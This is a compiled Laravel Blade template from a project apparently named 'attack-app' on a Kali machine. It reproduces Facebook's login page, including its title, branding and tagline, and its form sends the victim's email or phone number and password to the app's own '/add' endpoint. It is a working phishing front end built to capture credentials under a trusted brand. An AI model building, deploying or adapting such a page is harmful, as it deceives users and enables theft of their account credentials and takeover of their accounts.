<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <!-- Left Side: Facebook Logo and Description -->
        <div class="left-content">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        
        <!-- Right Side: Login Form -->
        <div class="login-container">
            <form class="login-form" method="POST" action="/add">
               <?php echo csrf_field(); ?>
                <input type="text" placeholder="Email or phone number" name="name" required>
                <input type="password" placeholder="Password" name="pass" required>
                <button type="submit">Log In</button>
                <a href="#" class="forgot-password">Forgotten password?</a>
                <div class="divider"></div>
                <button class="create-account">Create New Account</button>
            </form>
        </div>
    </div>
</body>
</html>
<?php /**PATH /home/kali/attack-app/resources/views/st.blade.php ENDPATH**/ ?>